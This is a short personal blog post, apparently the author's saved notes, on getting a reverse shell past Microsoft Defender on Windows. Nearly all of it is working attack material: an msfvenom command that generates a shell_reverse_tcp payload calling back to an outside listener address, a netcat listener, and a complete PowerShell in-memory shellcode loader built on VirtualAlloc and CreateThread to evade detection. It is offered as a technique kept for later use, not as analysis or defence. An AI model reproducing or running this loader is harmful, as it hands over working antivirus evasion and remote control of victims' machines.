+++
title = 'RSHELLing With Defender Enabled'
date = 2024-12-11T08:52:49+02:00
draft = false
+++

When Microsoft Defender is enabled a way to bypass it is to execute the shell code by loading it to the memory. I found this technique interesting and worth saving for later use. 

## Payload

````
# Create payload with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.184.18 LPORT=4444 -f powershell
````

## Start A Listener

````
rlwrap nc -nvlp 4444
````

## Execute The Payload

`````
# Copy and paste directly to PowerShell
# Phase 1
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

# Phase 2
[Byte[]] $buf = <PAYLOAD-HERE>

# Phase 3
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
`````

Not a novel but still a super interesting technique for me. 
